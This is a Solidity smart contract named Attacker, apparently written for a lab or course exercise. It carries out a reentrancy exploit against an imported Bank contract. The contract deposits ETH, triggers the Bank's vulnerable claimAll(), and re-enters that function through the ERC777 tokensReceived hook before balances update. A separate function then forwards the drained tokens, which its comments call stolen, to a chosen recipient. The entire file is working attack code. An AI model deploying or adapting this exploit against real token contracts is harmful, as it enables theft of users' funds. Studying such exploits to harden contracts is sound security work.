// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import "./Bank.sol";

contract Attacker is AccessControl, IERC777Recipient {
    bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");

    IERC1820Registry private _erc1820 = IERC1820Registry(
        0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24
    ); // EIP1820 registry address

    bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

    uint8 private depth = 0;
    uint8 private max_depth = 2;

    Bank public bank;

    event Deposit(uint256 amount);
    event Recurse(uint8 depth);

    constructor(address admin) {
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
        _grantRole(ATTACKER_ROLE, admin);

        // Register this contract as an ERC777 tokens recipient
        _erc1820.setInterfaceImplementer(
            address(this),
            TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
    }

    function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
        bank = Bank(bank_address);
        _grantRole(ATTACKER_ROLE, address(this));
        _grantRole(ATTACKER_ROLE, bank.token().address);
    }

    /*
        The main attack function that starts the reentrancy attack.
        amt is the amount of ETH the attacker will deposit initially.
    */
    function attack(uint256 amt) external payable {
        require(address(bank) != address(0), "Target bank not set");
        require(msg.value == amt, "ETH amount mismatch");

        // Deposit ETH into the Bank contract
        bank.deposit{value: amt}();
        emit Deposit(amt);

        // Trigger the vulnerable claimAll() to begin the reentrancy
        bank.claimAll();
    }

    /*
        After the attack, this function sends the stolen MCITR tokens
        to the target recipient.
    */
    function withdraw(address recipient) external onlyRole(ATTACKER_ROLE) {
        ERC777 token = bank.token();
        token.send(recipient, token.balanceOf(address(this)), "");
    }

    /*
        This is called when the Bank sends ERC777 tokens to this contract.
        It allows us to re-enter the claimAll function before balances are updated.
    */
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        emit Recurse(depth);

        // Perform reentrant call to claimAll before balance is updated
        if (depth < max_depth) {
            depth++;
            bank.claimAll();
        }
    }
}
